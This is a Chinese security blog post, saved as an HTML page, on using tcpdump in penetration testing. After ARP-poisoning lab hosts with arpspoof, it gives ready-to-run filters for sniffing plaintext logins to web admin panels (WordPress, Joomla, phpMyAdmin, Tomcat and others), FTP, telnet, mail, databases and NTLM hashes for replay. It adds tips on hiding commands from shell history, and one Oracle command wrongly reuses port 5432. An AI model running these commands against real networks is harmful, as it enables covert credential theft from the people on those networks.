@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="linux下的嗅探实践 [tcpdump篇]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>linux下的嗅探实践 [tcpdump篇] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/01/31/tcpdump-sniffer-pass/">
+                linux下的嗅探实践 [tcpdump篇]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-01-31</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/sniffer/">sniffer</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>单单对于渗透而言,我们可以拿 tcpdump 干些什么:<br>&nbsp;&nbsp;&nbsp;&nbsp;从工具命名不难看出,所谓 tcpdump 的意思,其实就是把 tcp 的数据[当然啦,它并非仅仅支持tcp/ip协议族] dump下来,我想作者应该也是这个意思,在常规生产环境中,运维或者协议分析师可能主要用它来捕捉一些敏感的流量行为(通过不同的数据特征来辨别出哪些流量可能带有入侵或者攻击行为),排查诊断各种网络故障,或者专门针对某个工具进行逆向(流量)分析等等……,就tcpdump本身来讲,它能做的事情非常多,真要仔细讲,可能会像wireshark那样,又得出本书,工具虽然小巧,但用途良多,下面就我们单单就实际渗透过程中的一些用法做些简单科普,主要还是用它来抓抓明文密码[当然,它本身的强大绝非仅限于此,个人能力有限,也没一下子涉及那么多,今天只单单说一个点(可能连个点都算不上吧,基本是没有任何技术含量的)]<br><br><br>以centos 6.x中的具体编译安装为例[在其它的发行版中安装方法基本类似],都非常简单,但考虑到文章的完整性想想还是一并说了算了(主要是想让大家能快速上手),工具是开源的(基于c,安装自然需要c编译器[gcc]),请自行到官方站点下载其源码包:<br><a href="http://www.tcpdump.org/" target="_blank" rel="external">http://www.tcpdump.org/</a><br><a id="more"></a><br><br><br>编译安装前的一些必要准备::<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先检查下当前系统有没有安装tcpdump,如果有,就先将其卸载</div><div class="line"><span class="comment"># rpm -qa | grep tcpdump</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">很显然,我这里系统自带的有tcpdump 是<span class="number">4.0</span>版本,确实有点儿老了[其实,新旧不太重要,关键是稳定能用就好],现在就把它卸载掉,咱们来重新编译安装最新版的<span class="number">4.9</span></div><div class="line"><span class="comment"># rpm -e tcpdump</span></div><div class="line"><span class="comment"># rpm -qa | grep tcpdump</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">首先,装好libpcap库,因为tcpdump依赖libpcap进行抓包[其实不仅仅tcpdump依赖它,很多linux下的抓包工具都依赖它,可能是直接用里面封装好的函数比较方便吧],所以在编译tcpdump之前,务必要把libpcap这个库装好,很简单,如下:</div><div class="line"><span class="comment"># cd libpcap-1.8.1</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install    检测依赖环境,生成makefile文件,编译</span></div><div class="line">可以看到,编译安装过程还是比较顺利的,如果目标环境不是特别恶劣,一般安装过程也不会有什么问题</div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">接着就来编译安装tcpdump,和libpcap编译安装过程并没什么不同,如下:</div><div class="line"><span class="comment"># cd tcpdump-4.9.0</span></div><div class="line"><span class="comment"># ./configure &amp;&amp; make &amp;&amp; make install</span></div><div class="line">可以看到,编译安装也一切正常</div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">装好完以后,先稍微测下,看看工具运行是否正常,可以看到,现在tcpdump的版本是<span class="number">4.9</span>,而非之前的<span class="number">4.0</span>,libpcap的版本是<span class="number">1.8</span>.<span class="number">1</span></div><div class="line"><span class="comment"># tcpdump -h</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">执行下面的命令,如果看到有数据流动,就表示tcpdump已经基本可用</div><div class="line"><span class="comment"># ping www.google.com </span></div><div class="line"><span class="comment"># tcpdump -i eth0[你自己的网卡接口] -c 12    新开一个终端监听</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">注意,如果编译过程中有什么错误,仔细看看提示的是什么东西,相信绝大部分原因可能就是目标的系统中没有装gcc(c编译器),gcc-c++,可以把gcc*先装上,之后再回来接着重新编译(记得在重新编译之前先执行下make clean)</div><div class="line"><span class="comment"># yum install gcc -y   </span></div><div class="line"><span class="comment"># yum install gcc-c++ -y   这是redhat系列发行版的名称,ubuntu系列中可能不是这个名字</span></div></pre></td></tr></table></figure>
+<p><br></p>
+<p>tcpdump [类似wireshark的命令行版本,虽然没wireshark那么简单易用,但对于一个命令行工具来讲,说心里话,它已经做的足够好了,蛮佩服作者的]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">几个常用选项(选项确实比较多,我只挑了几个相对比较常用的,更多更具体的选项用法,请直接自行man tcpdump进行参考):</div><div class="line">-D   显示当前系统中所有可用的网卡接口</div><div class="line">-i   指定用于嗅探的网卡接口</div><div class="line">-c   后面跟上要抓包的个数[要抓几个包]</div><div class="line">-s   指定抓取的数据包长度,设置为<span class="number">0</span>时,表示让tcpdump自行选择合适的长度进行抓取,务必加上,不然可能会抓不全</div><div class="line">-A   以ASCII码的形式显示每个数据包,分析http类数据非常好用</div><div class="line">-vvv 显示最详细的输出</div><div class="line">-w   将数据包直接写到文件中而不直接输出,这种有利于我们后续可以直接包丢到wireshark中去人工分析</div><div class="line">-U   将数据包的写入和保存同步,不用非等到缓冲区已满时才写入文件,通常配合 -w 一起使用</div><div class="line">-r   可以把之前用 -w 写入的数据包文件,再用 -r 选项进行读取</div><div class="line">-xx / -XX  以<span class="number">16</span>进制显示数据包,分析学习各种协议时非常直观</div><div class="line">-q   让输出的格式更为精简,有点儿类似安静模式</div><div class="line">-nn  不解析端口和主机名,其实就是不把端口解析成服务名,比如<span class="number">21</span> =&gt; ftp</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">常用几个过滤器关键字:</div><div class="line">host,port    指定ip和端口</div><div class="line">src,dst 指定数据流向,目的和源[可以是主机,端口]</div><div class="line">net 指定网段</div><div class="line"></div><div class="line">常用的几个过滤器运算符:</div><div class="line"><span class="keyword">and</span>(且) ,<span class="keyword">or</span>(或者),!(非)</div></pre></td></tr></table></figure>
+<p><br></p>
+<p>好了,在我们对tcpdump有了基本的了解之后,就可以开始尝试抓取各类明文密码数据了,想必大家都已经很清楚,在实际的渗透过程中,密码对我们来说意味着什么,还是那句话,这里只是单单针对实际渗透过程中的一些用法做些简要说明,更多的用法,大家请自行琢磨:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">测试环境,如下[已经全部桥接]:</div><div class="line">被嗅探的机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.196</span> (win7cn) <span class="number">192.168</span>.<span class="number">3.251</span>(这台机器上有opencart程序,和navcait工具,等会儿要用)</div><div class="line">嗅探者的机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.6</span> (kali)</div><div class="line">配置好了各种服务的服务器机器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.23</span> (win2008 r2)</div><div class="line">邮件服务器<span class="symbol">ip:</span> <span class="number">192.168</span>.<span class="number">3.30</span></div><div class="line">务必记得开启本机的路由转发,不然目标机器就上不了网了</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">先做好arp毒化,因为别人机器上的流量是不会无故流过你的机器的,所以,你务必要主动让别人的流量经过你,这样你才能抓到密码,这里就用dsniff套件中的arpspoof来毒化一下目标机器:</div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.196 192.168.3.1</span></div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.251 192.168.3.1</span></div><div class="line"><span class="comment"># arpspoof -i eth0 -t 192.168.3.1 192.168.3.6</span></div></pre></td></tr></table></figure>
+<p><img src="/img/arpspoof tcpdump.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">抓取指定机器上的各类 http 数据[主要是针对各类web后台登录的账户密码](默认的web端口是<span class="number">80</span>,但你也可以换成一些非常常规的web端口,比如,<span class="number">8080</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">8081</span>……不过前提是你要确定这些端口跑的确实是web服务)<span class="symbol">:</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 discuz 的管理员账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump discuz.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 joomla 的后台管理的账号密码[这里的账号密码字段去看下登录的那个表单里面就知道了]</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'password=|username=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump joomla.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 wordprss 的后台账号密码,注意这里的表单字段要稍微改下,后面过滤字段的方式都是一样的,自己去看下就好了</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'log=|pwd=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump wordpress.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 drupal 的后台账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'name=|pass=' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump drupal.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 opencart 的后台账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i --color=auto "username|password" -A 5</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump opencart.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 phpmyadmin 的数据库账号密码</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'pma_username|pma_password' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump phpmyadmin.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取华为家用路由的登录密码(目测是sha[有点儿像<span class="number">256</span>]系列的hash,总算碰到了一个加完密再传的 (: )</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 80 and host 192.168.3.196' | egrep -i 'password' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump huawei route.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓 tomcat 的 manager的登录账号密码,密码时base64编码的,解码下就好了</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -nnA 'tcp dst port 8080 and host 192.168.3.196' | egrep -i 'Authorization' --color=auto --line-buffered -B20</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump tomcat.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">除了上面提到的这些,其实,还有针对各种java控制台[大多数默认都在<span class="number">8080</span>端口上]的登录账号密码都是可以尝试的,这里就不一一演示了,手法基本都类似[只要不是基于ssl的,你都可以随便尝试],关于,如何抓取各种http密码数据暂时就先说到这里了,列举的都是一些极为简单粗暴的用法,大家可以根据自己的实际需求任意发挥[最终目的还是能抓到自己想要的东西],不过需要注意的是,有些目标内部的web服务并非都工作在默认的<span class="number">80</span>或者<span class="number">8080</span>端口上,也可能会跑在<span class="number">81</span>,<span class="number">82</span>,<span class="number">8081</span>……,这样的端口上,在实际渗透过程中,大家要多尝试,对目标的一些敏感信息要有敏锐的观察力[无意中可以激发自己的渗透灵感],根据这种方式,大家不妨尝试自行抓取分析各类常用软件中的一些http数据,至于怎么抓gmail,<span class="number">126</span>,outlook这类的基于tls/ssl账号密码[我们后面会再单独说明],以及其它你能想到的所有的可能会有账号密码的地方都可以随便尝试</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取指定机器的 ftp 明文账号密码(默认端口<span class="symbol">:</span><span class="number">21</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -nn  -s 0 host 192.168.3.196 and tcp dst port 21</span></div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -U host 192.168.3.196 and tcp dst port 21 -w ftp_pass.pcap  直接把包写到文件中,留存后续分析</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump ftp.jpg" alt="&quot;bypasscdn&quot;"><br><br><img src="/img/tcpdump ftp res wireshark.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 telnet 的登录账号密码,抓路由也许用得到[不过现在貌似大多数都换成ssl了(ssh)](默认端口<span class="symbol">:</span><span class="number">23</span>):</div><div class="line"><span class="comment"># tcpdump -vv -i eth0 -nn -s 0 host 192.168.3.196 and dst port 23 -w telnet_pass.pcap</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump telnet res.jpg" alt="&quot;bypasscdn&quot;"><br><br><img src="/img/tcpdump telnet.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">抓取网络中的sql语句,运气好的话兴趣还能抓到数据库的用户账号密码,当然,你可以通过自己写ettercap脚本对这些语句做一进一步的中间人利用[增删改查],比如权限够的情况下,可以尝试添加数据库用户,添加网站用户,等等……,因为sql都是明文传输,所以如果利用好了危害还是非常大的,不过这并不是今天的重点,我们今天还是想要简要说明下tcpdump在实战中的一些基本用途,至于那些中间人用户,抽空会再详细说明,不过实战中利用起来还是比较困难的,除非你自己的机器直接就正常的处在目标内网[比如,vpn内网,无线……]中,如果是这样,利用起来还是蛮舒服的</div><div class="line">抓取 mysql 的增删改查sql(默认端口<span class="number">3306</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -XX  dst port 3306 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump mysql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 mssql 的增删改查sql(默认端口<span class="number">1433</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 1433 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump mssql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 pgsql 的增删改查sql默认端口<span class="number">5432</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 5432 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tcpdump postgresql.jpg" alt="&quot;bypasscdn&quot;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">抓取 oracle 的增删改查sql(默认端口<span class="number">1521</span>),后面就不一一截图了,累:</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  dst port 5432 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">截获win内网的 ntlm hash(主要是为了重放):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  'dst port 445 and dst host 192.168.3.23'</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">smtp(默认端口<span class="symbol">:</span><span class="number">25</span>) /imap(默认端口<span class="symbol">:</span><span class="number">143</span>) /pop3(默认端口<span class="symbol">:</span><span class="number">110</span>) 抓取各类邮箱明文登录密码(如果是带s的,这样是抓不到的哦):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -XX  '(dst port 25 or dst port 143 or dst port 110) and dst host 192.168.3.30'</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ldap(默认端口<span class="symbol">:</span><span class="number">389</span>):</div><div class="line"><span class="comment"># tcpdump -nn -vv -A -i eth0 -s 0 -w /shared/tmp/ldap.cap dst host 192.168.3.23 and dst port 389</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">svn(默认端口<span class="symbol">:</span><span class="number">3690</span>):</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0  -A  dst port 3690 and dst host 192.168.3.23</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">尝试一句话tcpdump 截获内网中的各类明文密码数据(实际渗透中,账号密码字段,可以根据目标实际环境[观察目标网站后台的账号密码字段命名习惯]自己多写一些,以增加命中率):</div><div class="line"><span class="comment"># tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass|user' --color=auto --line-buffered -B20 -w res_bak.txt</span></div></pre></td></tr></table></figure>
+<p><br></p>
+<p>同样,我们也可以尝试利用tcpdump来简单捕获内网的一些入侵及攻击行为,实际测试过程中还有一些问题需要解决,后期搞通透了会继续更新上来,实在抱歉[最好直接在网关上搞]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的中间人行为:</div><div class="line">arp  dhcp icmp ……</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的端口扫描行为</div><div class="line">top <span class="number">46</span> 高危端口扫描</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">发现内网中的服务爆破行为:</div><div class="line">mssql(sa) smb() ftp() rdp() ssh() ldap() snmp() http()……</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检测内网中的有无指定的一些tcp马的数据特征,比如一些常用工具生成的payload特征[原谅我,到现在也没太搞明白meterpreter的内部数据结构,表哥们谁对这一块比较熟,诚心求教]</div><div class="line">msf</div></pre></td></tr></table></figure>
+<p>尝试利用tcpdump对网站进行一些临时性的流量监控:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">粗略抓取请求最频繁的ip[对于一般的CC还是可以的,如果是挂代理的就不能这样搞了]</div><div class="line"><span class="comment"># tcpdump -i eth0 -s 0 -tnn dst port 80 -c 100 | awk -F"." '&#123;print $1"."$2"."$3"."$4&#125;' | sort | uniq -c | sort -nr |head -20</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">记录请求最多的<span class="symbol">ip:</span></div><div class="line"><span class="comment"># netstat -anlp | grep 80 | grep tcp|awk '&#123;print $5&#125;'|awk -F: '&#123;print $1&#125;'|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk '/:80/&#123;split($5,ip,":");++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;' |sort -rn|head -n20</span></div><div class="line"><span class="comment"># iptables -I INPUT -s 扫描者的ip段 -j DROP</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">更多,待续……</div></pre></td></tr></table></figure>
+<p><br><br>一些小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;虽然是个小工具,但不乏大作为,尤其在目标系统是linux的情况下,利用系统已有的工具进行渗透,无疑是极好的,注意,实际渗透中,最好把它放在后台,如果你不想让命令记录被到history中,可以先 echo $HISTCONTROL看看,把它设置成空格开头的命令不记录就行了[可能需要你先拿到root],另外,如果你想深入的去学习某些协议的内部运作流程,tcpdump无疑也是一款非常好的入门工具,其实,就工具本身使用来讲,大家也都看到了,几乎是没有任何技术含量,真正考验你的还是对各种常用协议的熟知程度,从各种协议数据里面找到你想要的东西才是关键,最后,还是那句老话,工具是死的,人是活的,脑洞要大,才有可能把’不可能’变成’可能’……我知道,其实大家还有非常多的更精悍的用法,都没有放出来,总得有人先当这个杂碎,所以这里我就先献个丑,期待大家的精华</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/tcpdump/">#tcpdump</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+
+<center>
+<span>有偿提供各类全面靠谱的安全优化加固方案,入侵取证及全方位企业内部及个人网络安全培训...<font color="red"> &nbsp;&nbsp;klion@protonmail.com</span><br>
+<br>
+<br>
+<font size="5" color="#00FF7F" style="margin-left=-10px;">关注公众号</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">随意捐助 [ 微信 ]</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font size="5" color="#00FF7F">加入小密圈</font>
+<br>
+<br>
+<img src="/img/small.jpg"  alt="klionsec" />
